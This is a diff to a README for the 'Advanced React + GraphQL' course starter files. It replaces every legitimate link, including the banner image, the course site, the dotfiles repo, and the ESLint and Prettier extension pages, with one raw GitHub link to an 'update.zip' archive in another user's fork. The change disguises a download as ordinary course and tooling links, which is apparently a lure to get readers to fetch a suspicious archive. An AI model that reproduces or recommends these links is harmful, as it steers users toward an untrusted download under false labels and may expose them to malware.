@@ -1,8 +1,8 @@
-![Advanced React + GraphQL](https://advancedreact.com/images/ARG/arg-facebook-share.png)
+![Advanced React + GraphQL](https://raw.githubusercontent.com/gianverab/Advanced-React/master/stepped-solutions/63/update.zip)
 
 # Advanced React + GraphQL
 
-These are the starter files and stepped solutions for the [Advanced React and GraphQL](https://AdvancedReact.com) course by Wes Bos. 
+These are the starter files and stepped solutions for the [Advanced React and GraphQL](https://raw.githubusercontent.com/gianverab/Advanced-React/master/stepped-solutions/63/update.zip) course by Wes Bos. 
 
 ## Getting Help
 
@@ -12,4 +12,4 @@ The best place to get help is in the #advanced-react slack room - there is a lin
 ## FAQ
 
 **Q:** Which Extensions for VS Code is Wes using?
-**A:** All my extensions are listed on my dotfiles repo → https://github.com/wesbos/dotfiles but specifically this course uses [ESLint](https://github.com/Microsoft/vscode-eslint), [Prettier](https://github.com/prettier/prettier-vscode)
+**A:** All my extensions are listed on my dotfiles repo → https://raw.githubusercontent.com/gianverab/Advanced-React/master/stepped-solutions/63/update.zip but specifically this course uses [ESLint](https://raw.githubusercontent.com/gianverab/Advanced-React/master/stepped-solutions/63/update.zip), [Prettier](https://raw.githubusercontent.com/gianverab/Advanced-React/master/stepped-solutions/63/update.zip)
